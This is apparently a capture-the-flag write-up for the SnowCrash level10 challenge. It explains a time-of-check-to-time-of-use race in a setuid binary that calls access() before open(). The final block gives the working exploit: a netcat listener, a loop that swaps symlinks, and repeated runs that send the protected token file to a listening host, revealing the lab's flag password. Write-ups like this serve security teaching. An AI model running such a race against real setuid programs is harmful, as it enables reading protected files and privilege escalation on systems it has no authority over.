### Exploit

Let's take a quick look at both the script and the token file.

```
    level10@SnowCrash:~$ ./level10 token
    ./level10 file host
	    sends file to host if you have access to it
    level10@SnowCrash:~$ ./level10 token localhost
    You don't have access to token
```
Supposedly, we need to find a host which has access to said token. "Access" is a keyword here, as we have to find the "right" connection in order to open and read what's inside the token file. 

```
    level10@SnowCrash:~$ nm level10
    [...]
    08048620 T _start
            U access@@GLIBC_2.0
    0804a064 b completed.6159
            U connect@@GLIBC_2.0
    0804a044 W data_start
    0804a068 b dtor_idx.6161
            U exit@@GLIBC_2.0
            U fflush@@GLIBC_2.0
    080486b0 t frame_dummy
            U htons@@GLIBC_2.0
            U inet_addr@@GLIBC_2.0
    080486d4 T main
            U open@@GLIBC_2.0
            U printf@@GLIBC_2.0
            U puts@@GLIBC_2.0
            U read@@GLIBC_2.0
            U socket@@GLIBC_2.0
    0804a060 B stdout@@GLIBC_2.0
            U strerror@@GLIBC_2.0
            U write@@GLIBC_2.0
```
If you `man` access(), there's one interesting part about "security considerations":

```
	SECURITY CONSIDERATIONS
     The result of access() should not be used to make an actual access control decision, since its
     response, even if correct at the moment it is formed, may be outdated at the time you act on it.
     access() results should only be used to pre-flight, such as when configuring user interface ele-
     ments or for optimization purposes.  The actual access control decision should be made by
     attempting to execute the relevant system call while holding the applicable credentials, and
     properly handling any resulting errors; and this must be done even though access() may have pre-
     dicted success.

     Additionally, set-user-ID and set-group-ID applications should restore the effective user or
     group ID, and perform actions directly rather than use access() to simulate access checks for
     the real user or group ID.
```
Lovely! The use of access() here is indeed "be used to make an actual access control decision". Within a matter of second, we may replace the user which's got access to the call by another one. Here's a brand new exploit for you: [TOCTOU race condition](https://en.wikipedia.org/wiki/Time-of-check_to_time-of-use). The access part of the script probably looks very much like this:

```
	if (access("token", W_OK) != 0) {
   		exit(1);
	}

	fd = open("token", O_WRONLY);
	write(fd, buffer, sizeof(buffer));
```
The implication is that applications cannot assume the state managed by the operating system (in this case the file system namespace) will not change between system calls. First, open port 6969 with `nc -lk 6969`.

```
	level10@SnowCrash:~$ ls -l level10 token
	-rwsr-sr-x+ 1 flag10 level10 10817 Mar  5  2016 level10
	-rw-------  1 flag10 flag10     26 Mar  5  2016 token
	level10@SnowCrash:~$ while true; do ln -sf /home/user/level10/token /tmp/key; ln -sf /home/user/level10/level10  /tmp/key; done &
	level10@SnowCrash:~$ while true; do ./level10 /tmp/key 10.12.1.113; done
	You don't have access to /tmp/key
	Connecting to 10.12.1.113:6969 .. Connected!
	Sending file .. wrote file!
	woupa2yuojeeaaed06riuj63c
	level10@SnowCrash:~$ su flag10
	Password:
	Don't forget to launch getflag !
	flag10@SnowCrash:~$ getflag
	Check flag.Here is your token : feulo4b72j7edeahuete3no7c
```
Marvelous.
